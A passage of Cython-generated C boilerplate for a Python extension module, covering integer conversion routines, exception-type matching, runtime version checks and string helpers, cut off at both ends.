= 0;\n        int chunk_size = (sizeof(long) < 8) ? 30 : 62;\n        if (likely(PyLong_CheckExact(x))) {\n            v = __Pyx_NewRef(x);\n        } else {\n            v = PyNumber_Long(x);\n            if (unlikely(!v)) return (long) -1;\n            assert(PyLong_CheckExact(v));\n        }\n        {\n            int result = PyObject_RichCompareBool(v, Py_False, Py_LT);\n            if (unlikely(result < 0)) {\n                Py_DECREF(v);\n                return (long) -1;\n            }\n            is_negative = result == 1;\n        }\n        if (is_unsigned && unlikely(is_negative)) {\n            Py_DECREF(v);\n            goto raise_neg_overflow;\n        } else if (is_negative) {\n            stepval = PyNumber_Invert(v);\n            Py_DECREF(v);\n            if (unlikely(!stepval))\n                return (long) -1;\n        } else {\n            stepval = v;\n        }\n        v = NULL;\n        val = (long) 0;\n        mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;\n        shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;\n        for (bits = 0; bits < (int) sizeof(long) * 8 - chunk_size; bits += chunk_size) {\n            PyObject *tmp, *digit;\n            long idigit;\n            digit = PyNumber_And(stepval, mask);\n            if (unlikely(!digit)) goto done;\n            idigit = PyLong_AsLong(digit);\n            Py_DECREF(digit);\n            if (unlikely(idigit < 0)) goto done;\n            val |= ((long) idigit) << bits;\n            tmp = PyNumber_Rshift(stepval, shift);\n            if (unlikely(!tmp)) goto done;\n            Py_DECREF(stepval); stepval = tmp;\n        }\n        Py_DECREF(shift); shift = NULL;\n        Py_DECREF(mask); mask = NULL;\n        {\n            long idigit = PyLong_AsLong(stepval);\n            if (unlikely(idigit < 0)) goto done;\n            remaining_bits = ((int) sizeof(long) * 8) - bits - (is_unsigned ? 0 : 1);\n            if (unlikely(idigit >= (1L << remaining_bits)))\n                goto raise_overflow;\n            val |= ((long) idigit) << bits;\n        }\n        if (!is_unsigned) {\n            if (unlikely(val & (((long) 1) << (sizeof(long) * 8 - 1))))\n                goto raise_overflow;\n            if (is_negative)\n                val = ~val;\n        }\n        ret = 0;\n    done:\n        Py_XDECREF(shift);\n        Py_XDECREF(mask);\n        Py_XDECREF(stepval);\n#endif\n        if (unlikely(ret))\n            return (long) -1;\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "value too large to convert to long");\n    return (long) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "can\'t convert negative value to long");\n    return (long) -1;\n}\n\n\nstatic CYTHON_INLINE int __Pyx_PyLong_As_int(PyObject *x) {\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic push\n#pragma GCC diagnostic ignored "-Wconversion"\n#endif\n    const int neg_one = (int) -1, const_zero = (int) 0;\n#ifdef __Pyx_HAS_GCC_DIAGNOSTIC\n#pragma GCC diagnostic pop\n#endif\n    const int is_unsigned = neg_one > const_zero;\n    if (unlikely(!PyLong_Check(x))) {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_Long(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyLong_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\n    if (is_unsigned) {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (unlikely(__Pyx_PyLong_IsNeg(x))) {\n            goto raise_neg_overflow;\n        } else if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_DigitCount(x)) {\n                case 2:\n                    if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) >= 2 * PyLong_SHIFT)) {\n                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) >= 3 * PyLong_SHIFT)) {\n                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) >= 4 * PyLong_SHIFT)) {\n                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7\n        if (unlikely(Py_SIZE(x) < 0)) {\n            goto raise_neg_overflow;\n        }\n#else\n        {\n            int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n            if (unlikely(result < 0))\n                return (int) -1;\n            if (unlikely(result == 1))\n                goto raise_neg_overflow;\n        }\n#endif\n        if ((sizeof(int) <= sizeof(unsigned long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(int) <= sizeof(unsigned PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\n#endif\n        }\n    } else {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (__Pyx_PyLong_IsCompact(x)) {\n            __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))\n        } else {\n            const digit* digits = __Pyx_PyLong_Digits(x);\n            assert(__Pyx_PyLong_DigitCount(x) > 1);\n            switch (__Pyx_PyLong_SignedDigitCount(x)) {\n                case -2:\n                    if ((8 * sizeof(int) - 1 > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 2:\n                    if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -3:\n                    if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 3:\n                    if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case -4:\n                    if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n                case 4:\n                    if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {\n                        if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                        } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                        }\n                    }\n                    break;\n            }\n        }\n#endif\n        if ((sizeof(int) <= sizeof(long))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n        } else if ((sizeof(int) <= sizeof(PY_LONG_LONG))) {\n            __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n        }\n    }\n    {\n        int val;\n        int ret = -1;\n#if PY_VERSION_HEX >= 0x030d00A6 && !CYTHON_COMPILING_IN_LIMITED_API\n        Py_ssize_t bytes_copied = PyLong_AsNativeBytes(\n            x, &val, sizeof(val), Py_ASNATIVEBYTES_NATIVE_ENDIAN | (is_unsigned ? Py_ASNATIVEBYTES_UNSIGNED_BUFFER | Py_ASNATIVEBYTES_REJECT_NEGATIVE : 0));\n        if (unlikely(bytes_copied == -1)) {\n        } else if (unlikely(bytes_copied > (Py_ssize_t) sizeof(val))) {\n            goto raise_overflow;\n        } else {\n            ret = 0;\n        }\n#elif PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)\n        int one = 1; int is_little = (int)*(unsigned char *)&one;\n        unsigned char *bytes = (unsigned char *)&val;\n        ret = _PyLong_AsByteArray((PyLongObject *)x,\n                                    bytes, sizeof(val),\n                                    is_little, !is_unsigned);\n#else\n        PyObject *v;\n        PyObject *stepval = NULL, *mask = NULL, *shift = NULL;\n        int bits, remaining_bits, is_negative = 0;\n        int chunk_size = (sizeof(long) < 8) ? 30 : 62;\n        if (likely(PyLong_CheckExact(x))) {\n            v = __Pyx_NewRef(x);\n        } else {\n            v = PyNumber_Long(x);\n            if (unlikely(!v)) return (int) -1;\n            assert(PyLong_CheckExact(v));\n        }\n        {\n            int result = PyObject_RichCompareBool(v, Py_False, Py_LT);\n            if (unlikely(result < 0)) {\n                Py_DECREF(v);\n                return (int) -1;\n            }\n            is_negative = result == 1;\n        }\n        if (is_unsigned && unlikely(is_negative)) {\n            Py_DECREF(v);\n            goto raise_neg_overflow;\n        } else if (is_negative) {\n            stepval = PyNumber_Invert(v);\n            Py_DECREF(v);\n            if (unlikely(!stepval))\n                return (int) -1;\n        } else {\n            stepval = v;\n        }\n        v = NULL;\n        val = (int) 0;\n        mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;\n        shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;\n        for (bits = 0; bits < (int) sizeof(int) * 8 - chunk_size; bits += chunk_size) {\n            PyObject *tmp, *digit;\n            long idigit;\n            digit = PyNumber_And(stepval, mask);\n            if (unlikely(!digit)) goto done;\n            idigit = PyLong_AsLong(digit);\n            Py_DECREF(digit);\n            if (unlikely(idigit < 0)) goto done;\n            val |= ((int) idigit) << bits;\n            tmp = PyNumber_Rshift(stepval, shift);\n            if (unlikely(!tmp)) goto done;\n            Py_DECREF(stepval); stepval = tmp;\n        }\n        Py_DECREF(shift); shift = NULL;\n        Py_DECREF(mask); mask = NULL;\n        {\n            long idigit = PyLong_AsLong(stepval);\n            if (unlikely(idigit < 0)) goto done;\n            remaining_bits = ((int) sizeof(int) * 8) - bits - (is_unsigned ? 0 : 1);\n            if (unlikely(idigit >= (1L << remaining_bits)))\n                goto raise_overflow;\n            val |= ((int) idigit) << bits;\n        }\n        if (!is_unsigned) {\n            if (unlikely(val & (((int) 1) << (sizeof(int) * 8 - 1))))\n                goto raise_overflow;\n            if (is_negative)\n                val = ~val;\n        }\n        ret = 0;\n    done:\n        Py_XDECREF(shift);\n        Py_XDECREF(mask);\n        Py_XDECREF(stepval);\n#endif\n        if (unlikely(ret))\n            return (int) -1;\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "value too large to convert to int");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "can\'t convert negative value to int");\n    return (int) -1;\n}\n\n\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = __Pyx_PyType_GetSlot(a, tp_base, PyTypeObject*);\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\nstatic CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (cls == a || cls == b) return 1;\n    mro = cls->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            PyObject *base = PyTuple_GET_ITEM(mro, i);\n            if (base == (PyObject *)a || base == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(cls, a) || __Pyx_InBases(cls, b);\n}\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    if (exc_type1) {\n        return __Pyx_IsAnySubtype2((PyTypeObject*)err, (PyTypeObject*)exc_type1, (PyTypeObject*)exc_type2);\n    } else {\n        return __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n}\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        if (likely(PyExceptionClass_Check(t))) {\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(PyTuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n\nstatic unsigned long __Pyx_get_runtime_version(void) {\n#if __PYX_LIMITED_VERSION_HEX >= 0x030b0000\n    return Py_Version & ~0xFFUL;\n#else\n    static unsigned long __Pyx_cached_runtime_version = 0;\n    if (__Pyx_cached_runtime_version == 0) {\n        const char* rt_version = Py_GetVersion();\n        unsigned long version = 0;\n        unsigned long factor = 0x01000000UL;\n        unsigned int digit = 0;\n        int i = 0;\n        while (factor) {\n            while (\'0\' <= rt_version[i] && rt_version[i] <= \'9\') {\n                digit = digit * 10 + (unsigned int) (rt_version[i] - \'0\');\n                ++i;\n            }\n            version += factor * digit;\n            if (rt_version[i] != \'.\')\n                break;\n            digit = 0;\n            factor >>= 8;\n            ++i;\n        }\n        __Pyx_cached_runtime_version = version;\n    }\n    return __Pyx_cached_runtime_version;\n#endif\n}\n\n\nstatic int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer) {\n    const unsigned long MAJOR_MINOR = 0xFFFF0000UL;\n    if ((rt_version & MAJOR_MINOR) == (ct_version & MAJOR_MINOR))\n        return 0;\n    if (likely(allow_newer && (rt_version & MAJOR_MINOR) > (ct_version & MAJOR_MINOR)))\n        return 1;\n    {\n        char message[200];\n        PyOS_snprintf(message, sizeof(message),\n                      "compile time Python version %d.%d "\n                      "of module \'%.100s\' "\n                      "%s "\n                      "runtime version %d.%d",\n                       (int) (ct_version >> 24), (int) ((ct_version >> 16) & 0xFF),\n                       __Pyx_MODULE_NAME,\n                       (allow_newer) ? "was newer than" : "does not match",\n                       (int) (rt_version >> 24), (int) ((rt_version >> 16) & 0xFF)\n       );\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n}\n\n\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry const *t, PyObject **target, const char* const* encoding_names) {\n    while (t->s) {\n        PyObject *str;\n        if (t->is_unicode) {\n            if (t->intern) {\n                str = PyUnicode_InternFromString(t->s);\n            } else if (t->encoding) {\n                str = PyUnicode_Decode(t->s, t->n - 1, encoding_names[t->encoding], NULL);\n            } else {\n                str = PyUnicode_FromStringAndSize(t->s, t->n - 1);\n            }\n        } else {\n            str = PyBytes_FromStringAndSize(t->s, t->n - 1);\n        }\n        if (!str)\n            return -1;\n        *target = str;\n        if (PyObject_Hash(str) == -1)\n            return -1;\n        ++t;\n        ++target;\n    }\n    return 0;\n}\n\n#include <string.h>\nstatic CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s) {\n    size_t len = strlen(s);\n    if (unlikely(len > (size_t) PY_SSIZE_T_MAX)) {\n        PyErr_SetString(PyExc_OverflowError, "byte string is too long");\n        return -1;\n    }\n    return (Py_ssize_t) len;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    Py_ssize_t len = __Pyx_ssize_strlen(c_str);\n    if (unlikely(len < 0)) return NULL;\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, len);\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char* c_str) {\n    Py_ssize_t len = __Pyx_ssize_strlen(c_str);\n    if (unlikely(len < 0)) return NULL;\n    return PyByteArray_FromStringAndSize(c_str, len);\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_UTF8\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    {\n        const char* result;\n        Py_ssize_t unicode_length;\n        CYTHON_MAYBE_UNUSED_VAR(unicode_length); // only for __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n        #if __PYX_LIMITED_VERSION_HEX < 0x030A0000\n        if (unlikely(PyArg_Parse(o, "s#", &result, length) < 0)) return NULL;\n        #else\n        result = PyUnicode_AsUTF8AndSize(o, length);\n        #endif\n        #if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n        unicode_length = PyUnicode_GetLength(o);\n        if (unlikely(unicode_length < 0)) return NULL;\n        if (unlikely(unicode_length != *length)) {\n            PyUnicode_AsASCIIString(o);\n            return NULL;\n        }\n        #endif\n        return result;\n    }\n#else\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(o);\n        return NULL;\n    }\n#else\n    return PyUnicode_AsUTF8AndSize(o, length);\n#endif\n#endif\n}\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_UTF8\n    if (PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n    if (PyByteArray_Check(o)) {\n#if (CYTHON_ASSUME_SAFE_SIZE && CYTHON_ASSUME_SAFE_MACROS) || (CYTHON_COMPILING_IN_PYPY && (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE)))\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n#else\n        *length = PyByteArray_Size(o);\n        if (*length == -1) return NULL;\n        return PyByteArray_AsString(o);\n#endif\n    } else\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            return result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_LongWrongResultType(PyObject* result) {\n    __Pyx_TypeName result_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(result));\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ").  "\n                "The ability to return an instance of a strict subclass of int is deprecated, "\n                "and may be removed in a future version of Python.",\n                result_type_name)) {\n            __Pyx_DECREF_TypeName(result_type_name);\n            Py_DECREF(result);\n            return NULL;\n        }\n        __Pyx_DECREF_TypeName(result_type_name);\n        return result;\n    }\n    PyErr_Format(PyExc_TypeError,\n                 "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ")",\n                 result_type_name);\n    __Pyx_DECREF_TypeName(result_type_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_Long(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  PyObject *res = NULL;\n  if (likely(PyLong_Check(x)))\n      return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  if (likely(m && m->nb_int)) {\n      res = m->nb_int(x);\n  }\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\n      res = PyNumber_Long(x);\n  }\n#endif\n  if (likely(res)) {\n      if (unlikely(!PyLong_CheckExact(res))) {\n          return __Pyx_PyNumber_LongWrongResultType(res);\n      }\n  }\n  else if (!PyErr_Occurred()) {\n      PyErr_SetString(PyExc_TypeError,\n                      "an integer is required");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    if (likely(__Pyx_PyLong_IsCompact(b))) {\n        return __Pyx_PyLong_CompactValue(b);\n    } else {\n      const digit* digits = __Pyx_PyLong_Digits(b);\n      const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(b);\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyLong_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyLong_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject *__Pyx_Owned_Py_None(int b) {\n    CYTHON_UNUSED_VAR(b);\n    return __Pyx_NewRef(Py_None);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyLong_FromSize_t(size_t ival) {\n    return PyLong_FromSize_t(ival);\n}\n\n\n\n#if CYTHON_PEP489_MULTI_PHASE_INIT && CYTHON_USE_MODULE_STATE\n#ifndef CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n#if (CYTHON_COMPILING_IN_LIMITED_API || PY_VERSION_HEX >= 0x030C0000)\n  #define CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE 1\n#else\n  #define CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE 0\n#endif\n#endif\n#if CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE && !CYTHON_ATOMICS\n#error "Module state with PEP489 requires atomics. Currently that\'s one of\\\n C11, C++11, gcc atomic intrinsics or MSVC atomic intrinsics"\n#endif\n#if !CYTHON_MODULE_STATE_LOOKUP_THREAD_SAFE\n#define 